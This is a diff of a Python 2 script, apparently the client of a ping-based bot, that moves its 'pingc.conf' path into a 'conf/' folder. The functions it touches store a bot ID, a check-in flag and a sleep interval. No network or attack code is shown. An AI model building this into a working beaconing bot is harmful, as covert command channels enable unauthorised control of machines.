@@ -16,9 +16,10 @@ from scapy.all import *
 
 
 def getSleep():
+	conf_file = 'conf/pingc.conf'
 	cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
-        cp.readfp(open('pingc.conf', 'r'))
+        cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         sleep = cp.get(section,'sleep')
 	print "[*] Sleeping for %s seconds" % sleep
@@ -26,42 +27,46 @@ def getSleep():
 	return	
 
 def setSleep(sleep):
+	conf_file = 'conf/pingc.conf'
 	cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
-        cp.readfp(open('pingc.conf', 'r'))
+        cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         options = {'sleep': sleep}
         for option, value in options.items():
                 cp.set(section, option, value)
-        cp.write(open('pingc.conf', 'w'))
+        cp.write(open(conf_file, 'w'))
 
 
 def getId():
+	conf_file = 'conf/pingc.conf'
 	#print "[D] Getting bot Id"
 	cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
-        cp.readfp(open('pingc.conf', 'r'))
+        cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         id = cp.get(section,'id')
 	#print "[D] ID found: %s" % id
 	return id	
 
 def setId(botId):
+	conf_file = 'conf/pingc.conf'
 	#print "[D] Writing bot Id: ",botId
 	cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
-        cp.readfp(open('pingc.conf', 'r'))
+        cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         options = {'checkedin': '1',
                'id': botId}
         for option, value in options.items():
                 cp.set(section, option, value)
-        cp.write(open('pingc.conf', 'w'))
+        cp.write(open(conf_file, 'w'))
 
 def active():
+	conf_file = 'conf/pingc.conf'
 	cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
-        cp.readfp(open('pingc.conf', 'r'))
+        cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         return cp.get(section,'checkedin')
 
